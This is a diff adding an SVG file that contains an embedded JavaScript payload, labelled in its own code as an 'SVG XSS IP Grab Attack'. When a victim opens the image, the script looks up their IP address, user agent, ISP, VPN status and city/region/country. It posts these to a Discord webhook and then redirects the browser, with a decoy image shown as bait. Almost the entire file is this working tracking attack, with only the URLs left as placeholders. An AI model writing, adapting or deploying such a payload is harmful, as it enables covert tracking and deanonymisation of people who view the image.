@@ -1,0 +1,83 @@
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+<title>URL TITLE</title>
+<head>
+   <script src="https://cdn.rawgit.com/github/fetch/master/fetch.js">
+   
+   try {
+      IPURL = "IP GEO LOCATION URL HERE"
+      url2 = "REDIRECT URL HERE"
+      var discordURL = 'DISCORD WEBHOOK URL';
+      var opts = {
+      method: 'GET',      
+      headers: {}
+      };
+      fetch(IPURL, opts).then(function (response) {
+      return response.json()
+      })
+      .then(function (data) {
+      agent = navigator.userAgent
+      text=data.ip_address
+      vpn = data.security.is_vpn
+      loca = data.city+", "+data.region+", "+data.country
+      isp = data.connection.isp_name
+      var opts2 = {
+         method:"POST",
+         headers: {"Content-Type": "application/json"},
+         body: JSON.stringify({
+            username: "SVG XSS IP Grab Attack",
+            avatar_url: "https://i.imgur.com/Yztlbk4.png",
+            embeds: [
+            { 
+               title: 'SVG XSS Attack', 
+               fields: [ 
+               { 
+                  name: 'IP :globe_with_meridians:', 
+                  value: "`"+text+"`",
+                  inline: "true",
+               },
+               {
+                  name: 'User Agent :bust_in_silhouette:',
+                  value: "`"+agent+"`",
+                  inline: "true",
+               } ,
+               {
+                  name: 'ISP :classical_building:',
+                  value: "`"+isp+'`',
+                  inline: 'true'
+               },
+               {
+                  name: 'VPN :computer:',
+                  value: "`"+vpn+'`',
+                  inline: 'true'
+               },
+               {
+                  name:'Location :map:',
+                  value: "`"+loca+'`',
+                  inline: 'true'
+               },
+               {
+                  name:'Page Redirect?',
+                  value: "`"+url2+'`',
+                  inline: 'true'
+               }
+               ]
+            }
+            ]
+         })
+      }
+      fetch(discordURL, opts2).then(function (response) {
+         console.log(response)
+         window.location.replace(url2); 
+     }) 
+      })
+   }
+   catch(err) {
+      console.log(err)
+      window.location.replace("REDIRECT URL HERE");  
+   }
+   </script>
+   </head>
+   <image href="FAKE REDIRECT URL IMAGE HERE" x="0" y="0"/>
+</svg>
